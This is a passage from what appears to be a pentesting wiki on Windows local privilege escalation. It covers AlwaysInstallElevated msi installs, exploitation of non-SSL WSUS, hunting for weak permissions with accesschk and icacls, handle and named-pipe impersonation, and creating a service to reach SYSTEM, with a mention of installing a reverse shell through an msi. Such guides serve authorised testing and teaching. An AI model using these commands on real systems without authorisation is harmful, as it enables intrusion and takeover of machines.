msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

To exploit this vulnerability you can use: _exploit/windows/local/always\_install\_elevated_

## WSUS

You can compromise the system if the updates are not requested using http**S** but http.

You start by checking if the network uses a non-SSL WSUS update by running the following:

```text
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

If you get a reply such as:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` is equals to 1.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

You can use: [Wsuxploit](https://github.com/pimps/wsuxploit) - This is a MiTM weaponized exploit script to inject 'fake' updates into non-SSL WSUS traffic.

## Write Permissions

Check if you can modify some config file to read some special file or if you can modify some binary that is going to be executed by an Administrator account \(schedtasks\).

A way to find weak folder/files permissions in the system is doing:

```bash
accesschk.exe /accepteula 
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** \(`OpenProcess()`\) with **full access**. The same process **also create a new process** \(`CreateProcess()`\) **with low privileges but inheriting all the open handles of the main process**.  
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.  
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)  
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions \(not only full access\)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

A `pipe` is a block of shared memory that processes can use for communication and data exchange.

`Named Pipes` is a Windows mechanism that enables two unrelated processes to exchange data between themselves, even if the processes are located on two different networks. It's very similar to client/server architecture as notions such as `a named pipe server` and a named `pipe client` exist.

When a **client writes on a pipe**, the **server** that created the pipe can **impersonate** the **client** if it has **SeImpersonate** privileges. Then, if you can find a **privileged process if going to write on any pipe that you can impersonate**, you could be able to **escalate privileges** impersonating that process after it writes inside your created pipe. [**You can read this to learn how to perform this attack**](named-pipe-client-impersonation.md)**.**

## From Administrator Medium to High Integrity Level / UAC Bypass

\*\*\*\*[**Learn here**](../credentials.md#uac) **about what are the "integrity levels" in Windows, what is UAC and how to**[ **bypass it**](../credentials.md#uac)**.**

## **From High Integrity to System**

### **New service**

If you are already running on a High Integrity process, the **pass to SYSTEM** can be easy just **creating and executing a new service**:

```text
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```

### AlwaysInstallElevated

From a High Integrity process you could try to e**nable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.  
[More information about the registry keys involved and how to install a _.msi_ package here.](./#alwaysinstallelevated)

### From SeDebug + SeImpersonate to Full Token privileges

If you have those token privileges \(probably you will find this in an already High Integrity process\), you will be able to **open almost any process** \(not protected processes\) with the SeDebug privilege, **copy the token** of the process, and create an **arbitrary process with that token**.  
Using this technique is usually **selected any process running as SYSTEM with all the token privileges** \(_yes, you can find SYSTEM processes without all the token privileges_\).  
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

This technique is used by meterpreter to escalate in `getsystem`. The technique consists on **creating a pipe and then create/abuse a service to write on that pipe**. Then, the **server** that created the pipe using the **`SeImpersonate`** privilege will be able to **impersonate the token** of the pipe client \(the service\) obtaining SYSTEM privileges.  
If you want to [**learn more about name pipes you should read this**](./#named-pipe-client-impersonation).  
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

If you manages to **hijack a dll** being **loaded** by a **process** running as **SYSTEM** you will be able to execute arbitrary code with those permissions. Therefore Dll Hijacking is also useful to this kind of privilege escalation, and, moreover, if far **more easy to achieve from a high integrity process** as it will have **write permissions** on the folders used to load dlls.  
**You can** [**learn more about Dll hijacking here**](dll-hijacking.md)**.**
